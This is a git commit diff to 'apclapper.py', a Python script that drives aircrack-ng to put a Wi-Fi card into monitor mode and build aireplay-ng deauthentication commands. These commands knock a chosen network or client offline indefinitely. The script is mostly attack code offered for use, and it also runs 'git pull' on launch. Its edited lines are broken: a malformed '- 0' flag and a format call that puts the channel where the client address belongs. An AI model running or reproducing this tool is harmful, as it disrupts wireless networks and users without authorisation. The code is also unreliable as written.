06cf3626ecd2eafb73821aea72d861caf1f4d682
jobro247 <44535515+jobro247@users.noreply.github.com>
2018-11-21 21:25:34 -0800

    Update apclapper.py

--- apclapper.py
+++ apclapper.py
@@ -1,4 +1,5 @@
 import os
+print ("airclap, Created by Josiah Crofton, All Rights Reserved!")
 os.system("git pull")
 print ("if you want to exit the program just press CTRL and c to stop")
 print ("when running airodump-ng just press ctrl c to stop")
@@ -6,12 +7,13 @@ os.system("airmon-ng start wlan0")
 os.system("airodump-ng wlan0mon")
 x = raw_input("enter the bssid that you want to CLAP!:")
 e = raw_input("enter the channel of the channel you wanna CLAP!:")
-os.system("airodump-ng --channel %s --bssid %s wlan0mon")
 aireplay = raw_input("do you want to clap the entire network or just a client? Network/Client")
 if aireplay == 'Network':
-  os.system("aireplay-ng -0 0 -a (bssid) wlan0mon")
+  command = "aireplay-ng -0 0 -a %s wlan0mon"
+  print ("copy the command below and paste it in the terminal")
+  print(command % x)
 else:
   aireplay_client = raw_input("enter the client you wanna CLAP:")
-command = "aireplay-ng -0 0 -a %s -c  wlan0mon"
-print ("copy the command below and paste it in the terminal")
-print(command % x)
+  client_command = "aireplay-ng - 0 -a %s -c %s wlan0mon"
+  print ("copy the command below and paste it in the terminal")
+  print(client_command % x % e)
